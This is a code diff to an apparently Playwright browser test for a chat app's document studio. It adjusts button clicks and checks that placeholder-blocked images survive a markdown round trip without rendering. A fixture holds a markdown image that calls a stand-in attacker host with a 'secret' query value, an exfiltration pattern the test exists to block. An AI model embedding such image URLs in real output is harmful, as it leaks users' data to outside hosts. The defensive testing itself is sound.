@@ -135,7 +135,9 @@ async function openDoc(browser) {
   await o.ctx.route(`**/api/documents/${ids.doc}`, (r) => r.fulfill({ json: { document: doc } }))
   await o.page.goto(`/#/chat/${ids.s1}`)
   await o.page.getByText('Open in Slides Studio').first().waitFor()
-  await o.page.getByRole('button', { name: 'Open', exact: true }).first().click()
+  const openBtn = o.page.getByRole('button', { name: 'Open', exact: true }).first()
+  await openBtn.scrollIntoViewIfNeeded()
+  await openBtn.click()
   const root = o.page.locator('[data-studio="doc"]')
   await root.waitFor()
   return { ...o, root }
@@ -153,7 +155,7 @@ test('document studio: the page, the rich editor and the raw preview show placeh
   // round trip: the markdown behind the placeholder survives an edit (no silent loss of the image syntax)
   await editor.getByText('Hello').click()
   await page.keyboard.type('!')
-  await root.getByRole('button', { name: 'Edit Markdown' }).click()
+  await root.getByRole('button', { name: 'Edit as Markdown' }).click()
   await expect(root.locator('#doc-studio-md')).toHaveValue(/!\[pic\]\(https:\/\/evil\.example\/d\.png\?x=secret\)/)
   await expect(blocked(root.locator('.prose-chat'))).toHaveCount(2) // the raw-mode live preview
   expect(await root.locator('img[src*="evil.example"]').count()).toBe(0)
